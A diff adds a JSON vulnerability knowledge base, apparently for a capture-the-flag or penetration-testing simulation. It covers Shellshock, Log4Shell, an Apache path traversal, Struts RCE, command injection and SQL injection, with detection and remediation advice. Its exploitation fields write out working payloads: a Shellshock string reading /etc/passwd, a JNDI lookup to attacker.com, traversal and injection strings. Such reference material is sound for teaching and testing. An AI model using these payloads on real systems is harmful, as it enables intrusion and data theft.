@@ -1,0 +1,89 @@
+[
+  {
+    "id": "CVE-2014-6271",
+    "name": "Shellshock",
+    "severity": "CRITICAL",
+    "cvss": 10.0,
+    "affected": "GNU Bash through 4.3",
+    "description": "GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment. This is exploited via vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution.",
+    "exploitation": "The attacker sends a specially crafted HTTP header (typically User-Agent, Referer, or Cookie) to a CGI endpoint. The web server passes these headers as environment variables to Bash. A vulnerable Bash version will execute arbitrary commands embedded in the header value. Payload pattern: () { :; }; <command>  — for example: () { :; }; /bin/cat /etc/passwd. In modern simulations, direct string interpolation of user-controlled headers into bash -c calls creates the same class of vulnerability.",
+    "detection": "Look for CGI endpoints (paths containing /cgi-bin/). Send a request with a modified User-Agent header containing a command substitution such as $(id) or backtick-wrapped commands. If the output of the injected command appears in the response, the endpoint is vulnerable. Also check for response headers indicating old Apache or Bash versions (e.g., Server: Apache/2.2.x, X-Powered-By: Bash/4.x).",
+    "remediation": "Update Bash to version 4.3 patch 25 or later. Avoid passing unsanitised user input to shell commands. Use parameterised subprocess calls (e.g., subprocess.run with a list of arguments instead of shell=True or string interpolation).",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+      "https://www.exploit-db.com/exploits/34765"
+    ]
+  },
+  {
+    "id": "CVE-2014-7169",
+    "name": "Shellshock (incomplete fix)",
+    "severity": "CRITICAL",
+    "cvss": 10.0,
+    "affected": "GNU Bash through 4.3 bash43-025",
+    "description": "GNU Bash through 4.3 bash43-025 is vulnerable because the patch for CVE-2014-6271 was incomplete. Specially crafted environment variable values can still be used to execute arbitrary commands.",
+    "exploitation": "Similar to CVE-2014-6271 but uses alternative payload formats that bypass the initial patch. Example payloads include specially formatted function exports.",
+    "detection": "Same detection methods as CVE-2014-6271. Test with alternative payload formats if the original Shellshock payload is blocked.",
+    "remediation": "Apply the complete Bash security update that addresses both CVE-2014-6271 and CVE-2014-7169.",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2014-7169"]
+  },
+  {
+    "id": "CVE-2021-44228",
+    "name": "Log4Shell",
+    "severity": "CRITICAL",
+    "cvss": 10.0,
+    "affected": "Apache Log4j 2.0-beta9 through 2.14.1",
+    "description": "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
+    "exploitation": "Inject ${jndi:ldap://attacker.com/exploit} into any logged field (User-Agent, form fields, etc). Log4j resolves the JNDI lookup, connecting to the attacker's LDAP server which responds with a malicious Java class.",
+    "detection": "Send payloads containing ${jndi:ldap://...} in various input fields and headers. Monitor DNS callbacks or use tools like Burp Collaborator. Check for Log4j in application dependencies.",
+    "remediation": "Upgrade to Log4j 2.17.0 or later. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath.",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
+  },
+  {
+    "id": "CVE-2021-41773",
+    "name": "Apache HTTP Server Path Traversal",
+    "severity": "HIGH",
+    "cvss": 7.5,
+    "affected": "Apache HTTP Server 2.4.49",
+    "description": "A flaw in path normalisation in Apache HTTP Server 2.4.49 allows an attacker to use a path-traversal attack to map URLs to files outside the directories configured by Alias-like directives.",
+    "exploitation": "Send a request with URL-encoded path traversal sequences: GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd. The flawed normalisation allows bypassing directory restrictions.",
+    "detection": "Send crafted path-traversal requests with dot-dot sequences using URL encoding. Check the Apache version header in responses.",
+    "remediation": "Upgrade Apache HTTP Server to 2.4.51 or later.",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"]
+  },
+  {
+    "id": "CVE-2017-5638",
+    "name": "Apache Struts 2 RCE",
+    "severity": "CRITICAL",
+    "cvss": 10.0,
+    "affected": "Apache Struts 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1",
+    "description": "The Jakarta Multipart parser in Apache Struts 2 has incorrect exception handling that permits performing remote code execution via crafted Content-Type, Content-Disposition, or Content-Length HTTP headers.",
+    "exploitation": "Send a malicious Content-Type header containing an OGNL expression to any Struts 2 endpoint. The parser evaluates the expression during error handling.",
+    "detection": "Send requests with OGNL expressions in Content-Type header. Look for Struts-specific error pages or headers.",
+    "remediation": "Upgrade to Struts 2.3.32 or 2.5.10.1 or later.",
+    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"]
+  },
+  {
+    "id": "GENERAL-CMDI",
+    "name": "OS Command Injection",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "affected": "Any application passing user input to system shell commands",
+    "description": "OS command injection occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell. The attacker can execute arbitrary operating system commands on the host.",
+    "exploitation": "Common injection patterns: (1) Command chaining with ; or && — e.g. 127.0.0.1; cat /etc/passwd (2) Command substitution with $() or backticks — e.g. $(whoami) (3) Pipe injection with | — e.g. 127.0.0.1 | id. For endpoints that concatenate user input into shell commands (ping, nslookup, etc.), try appending a semicolon followed by an OS command.",
+    "detection": "Identify parameters passed to OS commands (ping, traceroute, nslookup, etc). Inject time-based payloads like ;sleep 5 and measure response delay. Inject echo payloads and look for output in response.",
+    "remediation": "Never pass user input directly to shell commands. Use parameterised APIs (e.g. subprocess.run with a list). Implement strict input validation with allowlists. Apply the principle of least privilege.",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"]
+  },
+  {
+    "id": "GENERAL-SQLI",
+    "name": "SQL Injection",
+    "severity": "CRITICAL",
+    "cvss": 9.8,
+    "affected": "Any application building SQL queries via string concatenation with user input",
+    "description": "SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.",
+    "exploitation": "Classic test: input a single quote ' and observe error messages. UNION-based: ' UNION SELECT 1,2,3-- extracts data from other tables. Boolean-based blind: ' OR 1=1-- returns all rows. For extracting specific data: ' UNION SELECT id,flag,null FROM secrets-- retrieves hidden flags.",
+    "detection": "Input a single quote in parameters and check for SQL error messages. Try OR 1=1 payloads. Use time-based detection with SLEEP() or WAITFOR DELAY.",
+    "remediation": "Use parameterised queries / prepared statements. Use ORM frameworks. Validate and sanitise all user input. Apply least-privilege database accounts.",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"]
+  }
+]
